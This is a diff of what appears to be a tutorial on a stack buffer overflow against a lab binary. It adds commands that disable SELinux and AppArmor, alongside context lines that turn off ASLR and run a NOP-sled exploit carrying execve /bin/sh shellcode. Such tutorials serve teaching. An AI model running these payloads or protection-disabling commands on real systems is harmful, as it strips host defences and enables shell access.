@@ -210,12 +210,18 @@ But we can disable it momentarily
 ```
 echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
 ```
+Also we may need to disable selinux and apparmor in order for this exploit to work:
+```
+sudo setenforce 0
+sudo systemctl stop apparmor
 
+```
 And for last time:
 ```
 ./vuln $(python -c 'print "\x90" * (524-22-30+2) + "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05" + "\x7f\xff\xff\xff\xde\xad"[::-1] * 5  ')
 $
 ```
+
 
 We got our exploit working.
 
